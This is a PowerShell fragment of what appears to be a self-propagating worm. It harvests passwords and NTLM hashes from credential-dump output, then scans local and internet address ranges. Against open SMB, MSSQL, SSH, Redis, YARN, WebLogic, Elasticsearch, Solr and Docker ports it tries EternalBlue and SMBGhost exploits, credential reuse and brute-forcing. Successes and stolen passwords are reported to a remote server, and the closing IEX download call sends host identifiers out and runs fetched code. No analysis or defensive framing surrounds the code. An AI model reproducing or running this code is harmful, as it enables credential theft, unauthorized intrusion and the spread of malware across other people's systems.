            if (($ppp -ne "(null)") -and ($getpasswd -notcontains $ppp) -and ($ppp.length -lt 20)){

            $getpasswd += "$ppp"

            }

            if (($ppp -ne "(null)") -and ($allpass -notcontains $ppp) -and ($ppp.length -lt 20)){

            $allpass += "$ppp"

            }

        }

        foreach($hhh in $nn){

            $hhh=$hhh.value.trim().Replace('*NTLM:', "");

            "get hash:$hhh"

            if (($hhh -ne '31d6cfe0d16ae931b73c59d7e0c089c0') -and ($gethashs -notcontains $hhh)){

            $gethashs += "$hhh"

            }

        }

        foreach($ddd in $dd){

            $ddd=$ddd.value.trim().Replace('*Domain:', "");

            if (($getdomain -notcontains $ddd) -and ($ddd.IndexOf("`$") -eq -1) -and ($ddd -ne "(null)") -and ($ddd -ne "workgroup") -and ($ddd -ne "$env:COMPUTERNAME")){

            $getdomain += "$ddd"

            }

        }

    }

}catch{}

write-host "done...."

foreach($pass in $allpass){

    $temphash=Gen-NTLM $pass

    if ($allhash -notcontains $temphash){

        $allhash += "$temphash"

    }

}

foreach($thash in $temphashes){

    if ($allhash -notcontains $thash){

        $allhash += "$thash"

    }

}

$inter_flag=$false

$tcount=256

$start_time=Get-Date -UFormat "%s"

while($true)

{

    if(((Get-Date -UFormat "%s")-$start_time) -gt 60000) {break}

    $smb_portopen = @()

    $ms_portopen = @()

    $rdp_portopen = @()

    $ssh_portopen = @()

    $redis_portopen = @()

    getipaddrs $inter_flag

    for($t=0;$t -lt 2;$t++) {

        if($inter_flag) {$t=1}

        else {

            $inter_flag=$true

        }

        if($t -eq 0){

            $sc_code = $sc

            $mssql_code = $mssql_cmd

            $ipc_code = $ipc_cmd

            $smgh_code = $smgh_cmd

            $rdp_code = $rdp_cmd

            $ssh_code = $ssh_cmd

            $redis_code = $redis_cmd

            $yarn_code = $yarn_cmd

            $logic_code = $logic_cmd

            $es_code = $es_cmd

            $solr_code = $solr_cmd

            $docker_code = $docker_cmd

            $ipaddresses=$ipaddrs_i

        } else {

            $sc_code = $sco

            $mssql_code = $mssqlo_cmd

            $ipc_code = $ipco_cmd

            $smgh_code = $smgho_cmd

            $rdp_code = $rdpo_cmd

            $ssh_code = $ssho_cmd

            $redis_code = $rediso_cmd

            $logic_code = $logico_cmd

            $es_code = $eso_cmd

            $solr_code = $solro_cmd

            $docker_code = $dockero_cmd

            $ipaddresses=$ipaddrs_o

        }

        $internet_ip = (Test-Connection -ComputerName $env:computername -count 1).ipv4address.IPAddressToString

        for($i=0;$i -lt $ipaddresses.count;$i+=$tcount){

            write-host "start smb port open scanning..."

            $smb_portopen = localscan -port 445 -addresses $ipaddresses[$i..($i+$tcount-1)]

            $old_portopen = localscan -port 65529 -addresses $smb_portopen[1]

            foreach($currip in $smb_portopen[1]){

                if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){                   

                    write-host "start ipc scanning....$currip"

                    for($n = 0; $n -lt $alluser.Count; $n++){

                        write-host $alluser[$n] 

                        copyrun -ip $currip -thedomain "localhost" -user $alluser[$n] -cmd $ipc_code

                    }

                    for($nn = 0; $nn -lt $getdomain.Count; $nn++){

                        if($getdomain[$nn] -ne '.'){

                            for($uu = 0; $uu -lt $getusers.Count; $uu++){

                                copyrun -ip $currip -thedomain $getdomain[$nn] -user $getusers[$uu] -cmd $ipc_code

                            }

                        }

                    }   

                    try{

                        write-host "start eb scanning...$currip"

                        $vul=[PingCastle.Scanners.m17sc]::Scan($currip)

                        if($vul){  

                            write-host "[+]$currip seems eb vulnerable..." 

                            $res = eb7 $currip $sc_code   

                            if($res) {

                                write-host "$currip eb7 got it!!!" 

                                try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=eb7&iip='+$internet_ip+'&ip='+$currip+'&t='+$t)}catch{}

                            } else {

                                $res = eb8 $currip $sc_code

                                if($res) {

                                    try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=eb8&iip='+$internet_ip+'&ip='+$currip+'&t='+$t)}catch{}

                                    write-host "$currip eb8 got it!!!" 

                                }

                            }

                        }

                    }catch{}

                    try{

                        write-host "start smbghost scanning...$currip"

                        $ret = smbghost_check $currip

                        if($ret -eq 1){

                            write-host "[+]$currip seems smbghost vulnerable..."

                            try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=smbhost&iip='+$internet_ip+'&ip='+$currip+'&t='+$t)}catch{}

                            Start-Sleep -Seconds 2

                            $smb_retry=3

                            while($smb_retry-- -gt 0){

                                $ret1=smbghost_exec $currip $smgh_code

                                if($ret1){

                                    write-host "[+]got it!!"

                                    try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=smbhost_exec&iip='+$internet_ip+'&ip='+$currip+'&t='+$t)}catch{}

                                    break

                                }

                            }

                        }

                    }catch{}

                }

            }

            write-host "start mssql port open scanning..."

            $ms_portopen = localscan -port 1433 -addresses $ipaddresses[$i..($i+$tcount-1)]

            $old_portopen = localscan -port 65529 -addresses $ms_portopen[1]

            foreach($currip in $ms_portopen[1]) {

                if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){

                    write-host "start mssql burping...$currip"

                    for($n=0; $n -lt $allpass.count; $n++){

                        $flag=$false

                        write-host("Try pass: "+$allpass[$n])

                        $flag,$banner = (mssqlrun -ip $currip -pass $allpass[$n] -cmd $mssql_code -cmd1 $mssql_code)[-2..-1]

                        if($flag) {

                            try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=ms&iip='+$internet_ip+'&ip='+$currip+'&pass='+$allpass[$n]+'&t='+$t+'&b='+$banner)}catch{}

                            break

                        }

                    }

                }

            }

            write-host "start ssh port open scanning..."

            $ssh_portopen = localscan -port 22 -addresses $ipaddresses[$i..($i+$tcount-1)]

            $old_portopen = localscan -port 65529 -addresses $ssh_portopen[1]

            foreach($currip in $ssh_portopen[1]) {

                if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){

                    write-host "start ssh burping...$currip"

                    foreach($password in $allpass){

                        write-host "Try pass:$password"

                        $flag1 = -1

                        $flag1 = sshbrute $currip "root" $password $ssh_code

                        if($flag1 -eq 1){

                            write-host "SUCC!!"

                            try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=ssh&iip='+$internet_ip+'&ip='+$currip+'&pass='+$password+'&t='+$t)}catch{}

                            break

                        }

                    }

                }

            }

            write-host "start redis port1 open scanning..."

            $redis_portopen = localscan -port 6379 -addresses $ipaddresses[$i..($i+$tcount-1)]

            $old_portopen = localscan -port 65529 -addresses $redis_portopen[1]

            foreach($currip in $redis_portopen[1]) {

                if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){

                    write-host "start redis command check...$currip on port 6379"

                    $flag1 = redisexec $currip 6379 $redis_code

                    if($flag1 -gt 0){

                        write-host "SUCC!!"

                        try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=rds&f='+$flag1+'&iip='+$internet_ip+'&ip='+$currip+'&t='+$t)}catch{}

                        break

                    }

                }

            }

            write-host "start redis port2 open scanning..."

            $redis_portopen1 = localscan -port 16379 -addresses $ipaddresses[$i..($i+$tcount-1)]

            $old_portopen = localscan -port 65529 -addresses $redis_portopen1[1]

            foreach($currip in $redis_portopen1[1]) {

                if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){

                    write-host "start redis command check...$currip on port 16379"

                    $flag1 = redisexec $currip 16379 $redis_code

                    if($flag1 -gt 0){

                        write-host "SUCC!!"

                        try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=rds1&f='+$flag1+'&iip='+$internet_ip+'&ip='+$currip+'&t='+$t)}catch{}

                        break

                    }

                }

            }

            write-host "start yarn port open scanning..."

            $yarn_portopen = localscan -port 8088 -addresses $ipaddresses[$i..($i+$tcount-1)]

            $old_portopen = localscan -port 65529 -addresses $yarn_portopen[1]

            foreach($currip in $yarn_portopen[1]) {

                if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){

                    write-host "start yarn service check...$currip"

                    $flag2 = yarnexec $currip $yarn_code

                    if($flag2 -eq $true){

                        write-host "SUCC!!"

                        try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=yarn&iip='+$internet_ip+'&ip='+$currip+'&t='+$t)}catch{}

                        break

                    }

                }

            }

            write-host "start logic port open scanning..."

            $logic_portopen = localscan -port 7001 -addresses $ipaddresses[$i..($i+$tcount-1)]

            $old_portopen = localscan -port 65529 -addresses $logic_portopen[1]

            foreach($currip in $logic_portopen[1]) {

                if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){

                    write-host "start logic service check...$currip"

                    if($logic_code.gettype() -eq @().gettype()){

                        $flag1 = logicexec $currip $logic_code[1].replace("'","\'").replace("\","\\")

                        $flag2 = logicexec $currip $logic_code[0].replace("'","\'").replace("\","\\")

                        if($flag1 -ne $false -or $flag2 -ne $false){

                            write-host "SUCC!!"

                            try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=logic&f1='+$flag1+'&f2='+$flag2+'&iip='+$internet_ip+'&ip='+$currip+'&t='+$t)}catch{}

                            break

                        }

                    }

                }

            }

            write-host "start es port open scanning..."

            $es_portopen = localscan -port 9200 -addresses $ipaddresses[$i..($i+$tcount-1)]

            $old_portopen = localscan -port 65529 -addresses $es_portopen[1]

            foreach($currip in $es_portopen[1]) {

                if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){

                    write-host "start es service check...$currip"

                    if($es_code.gettype() -eq @().gettype()){

                        $flag1 = esexec $currip $es_code[1].replace("'","\'").replace("\","\\")

                        $flag2 = esexec $currip $es_code[0].replace("'","\'").replace("\","\\")

                        if($flag1 -eq $true -or $flag2 -eq $true){

                            write-host "SUCC!!"

                            try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=es&iip='+$internet_ip+'&ip='+$currip+'&t='+$t)}catch{}

                            break

                        }

                    }

                }

            } 

            write-host "start solr port open scanning..."

            $solr_portopen = localscan -port 8983 -addresses $ipaddresses[$i..($i+$tcount-1)]

            $old_portopen = localscan -port 65529 -addresses $solr_portopen[1]

            foreach($currip in $solr_portopen[1]) {

                if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){

                    write-host "start solr service check...$currip"

                    if($solr_code.gettype() -eq @().gettype()){

                        $flag1 = solrexec $currip $solr_code[1].replace("'","\'").replace("\","\\")

                        $flag2 = solrexec $currip $solr_code[0].replace("'","\'").replace("\","\\")

                        if($flag1 -ne $false -or $flag2 -ne $false){

                            write-host "SUCC!!"

                            try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=solr&f1='+$flag1+'&f2='+$flag2+'&iip='+$internet_ip+'&ip='+$currip+'&t='+$t)}catch{}

                            break

                        }

                    }

                }

            }

            write-host "start docker port open scanning..."

            $docker_portopen = localscan -port 2375 -addresses $ipaddresses[$i..($i+$tcount-1)]

            $old_portopen = localscan -port 65529 -addresses $docker_portopen[1]

            foreach($currip in $docker_portopen[1]) {

                if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){

                    write-host "start docker service check...$currip"

                    $flag1 = dockerexec $currip $docker_code

                    if($flag1 -ne $false){

                        write-host "SUCC!!"

                        try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=docker&f1='+$flag1+'&iip='+$internet_ip+'&ip='+$currip+'&t='+$t)}catch{}

                        break

                    }

                }

            }

        }

        $retry++

        write-host "reporting"

        try{

            $mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ $true}).Macaddress | select-object -first 1

            $guid = (get-wmiobject Win32_ComputerSystemProduct).UUID

            $comp_name = $env:COMPUTERNAME

            $mf = test-path $mimipath

            IEX(New-Object Net.WebClient).DownloadString($down_url+'/log.json?V='+$VVERSION+'&'+$comp_name+'&'+$guid+'&'+$mac+'&'+$internet_ip+'&r='+$retry+'&pc1='+$smb_portopen[1].count+'&pc2='+$ms_portopen[1].count+'&pc3='+$ssh_portopen[1].count+'&pc4='+$rdp_portopen[1].count+'&pc5='+$redis_portopen[1].count+'&pc6='+$redis_portopen1[1].count+'&pc7='+$yarn_portopen[1].count+'&pc8='+$logic_portopen[1].count+'&pc9='+$es_portopen[1].count+'&pc10='+$solr_portopen[1].count+'&pci='+$ipaddrs_i.count+'&pco='+$ipaddrs_o.count+'&pcb='+$global:ipaddrs_b+'&mi='+($getpasswd -join "^^")+'&mf='+[Int]$mf)

        }catch{}

    }

    "END"

}